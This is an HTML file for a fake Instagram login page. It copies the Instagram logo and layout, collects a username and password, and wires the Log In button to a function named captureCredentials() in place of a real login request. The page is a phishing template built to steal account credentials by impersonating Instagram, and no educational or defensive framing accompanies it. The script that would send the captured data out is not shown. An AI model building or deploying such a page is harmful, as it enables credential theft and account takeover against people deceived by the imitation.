<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_logo_2016.svg" alt="Instagram Logo" class="logo">
        </div>
        <form id="login-form" action="javascript:void(0)">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" onclick="captureCredentials()">Log In</button>
        </form>
        <div class="divider">
            <span>OR</span>
        </div>
        <button class="fb-login">Log in with Facebook</button>
        <div class="signup-link">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
